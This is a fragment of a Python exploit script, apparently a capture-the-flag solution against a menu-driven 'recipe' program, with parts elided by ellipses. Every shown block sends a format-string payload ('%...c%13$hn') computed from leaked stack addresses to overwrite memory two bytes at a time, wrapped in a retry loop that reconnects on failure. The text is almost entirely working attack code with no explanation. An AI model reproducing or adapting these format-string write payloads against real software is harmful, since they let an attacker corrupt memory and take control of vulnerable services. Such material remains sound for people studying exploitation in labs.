...
#y.interactive()
    ...
    try:
        new_recipe( '%{}c%13$hn\n'.format( ( stk & 0xffff ) + 0x40 + 8 + 8 + 8 + 4  - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )
    ...
    try:
        new_recipe( '%{}c%13$hn\n'.format( ( stk & 0xffff ) + 0x40 + 8 + 8 + 8 + 2  - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )
    ...
    try:
        new_recipe( '%{}c%13$hn\n'.format( ( stk & 0xffff ) + 0x40 + 8 + 8 + 8  - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )
    ...
    try:
        new_recipe( '%{}c%13$hn\n'.format( ( stk & 0xffff ) + 0x40 + 8 + 8 + 4  - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )
    ...
    try:
        new_recipe( '%{}c%13$hn\n'.format( ( stk & 0xffff ) + 0x40 + 8 + 8 + 2  - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )
    ...
    try:
        new_recipe( '%{}c%13$hn\n'.format( ( stk & 0xffff ) + 0x40 + 8 + 8  - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )
    ...
    try:
        new_recipe( '%{}c%13$hn\n'.format( ( stk2 & 0xffff ) + 0x20 + 8 - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )
